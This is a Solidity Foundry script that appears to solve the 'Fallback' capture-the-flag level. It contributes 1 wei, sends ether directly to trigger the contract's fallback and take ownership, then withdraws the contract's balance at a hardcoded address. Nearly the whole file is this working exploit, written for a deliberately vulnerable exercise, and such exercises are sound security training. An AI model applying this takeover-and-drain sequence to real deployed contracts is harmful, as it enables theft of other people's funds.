// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Fallback} from "../src/01-Fallback.sol";

contract FallbackSolution is Script {
    // Address of the deployed Fallback contract
    Fallback public fallbackInstance = Fallback(payable(0xe87c44A657756103F4B7e0c3CFa7F7bd6fFD7c1b));
    // address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));

    function run() external {        
        vm.startBroadcast();
        fallbackInstance.contribute{value: 1 wei}();
        address(fallbackInstance).call{value: 1 wei}("");
        console.log("Now Owner is:", fallbackInstance.owner());
        console.log("My Address is:", vm.envAddress("MY_ADDRESS"));
        fallbackInstance.withdraw();
        console.log("Balance after withdraw:", address(fallbackInstance).balance);
        vm.stopBroadcast(); 
    }
}